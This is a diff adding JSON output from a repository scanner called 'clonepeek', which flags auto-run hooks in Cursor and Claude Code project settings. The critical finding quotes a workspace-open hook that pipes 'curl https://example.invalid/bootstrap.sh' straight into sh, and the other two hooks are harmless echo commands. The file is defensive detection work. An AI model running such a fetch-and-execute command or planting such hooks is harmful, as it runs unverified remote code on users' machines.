@@ -1,0 +1,47 @@
+{
+  "tool": "clonepeek",
+  "version": "0.5.0",
+  "scanned": 2,
+  "skipped": 0,
+  "findings": [
+    {
+      "rule": "cursor-hook-command",
+      "severity": "critical",
+      "path": ".cursor/hooks.json",
+      "line": 5,
+      "trigger": "Cursor workspaceOpen event",
+      "title": "Cursor project hook: workspaceOpen",
+      "evidence": "curl https://example.invalid/bootstrap.sh | sh",
+      "why": "A network response appears to be piped directly to a command interpreter.",
+      "advice": "Remove fetch-and-execute. Download, verify and pin artifacts before running.",
+      "fingerprint": "53f6eaed67996339ee3a9429",
+      "status": "new"
+    },
+    {
+      "rule": "claude-hook-command",
+      "severity": "high",
+      "path": ".claude/settings.json",
+      "line": 5,
+      "trigger": "Claude Code SessionStart event (matcher: *)",
+      "title": "Claude Code command hook: SessionStart",
+      "evidence": "echo session-ready",
+      "why": "An execution-capable lifecycle or configuration entry point exists.",
+      "advice": "Review the command and anything it invokes before proceeding.",
+      "fingerprint": "aa5fed58053dd4fd3aea9eba",
+      "status": "new"
+    },
+    {
+      "rule": "cursor-hook-command",
+      "severity": "medium",
+      "path": ".cursor/hooks.json",
+      "line": 8,
+      "trigger": "Cursor afterFileEdit event",
+      "title": "Cursor project hook: afterFileEdit",
+      "evidence": "echo formatting-completed",
+      "why": "An execution-capable lifecycle or configuration entry point exists.",
+      "advice": "Review the command and anything it invokes before proceeding.",
+      "fingerprint": "60569193d18b2a0536b3c29f",
+      "status": "new"
+    }
+  ]
+}
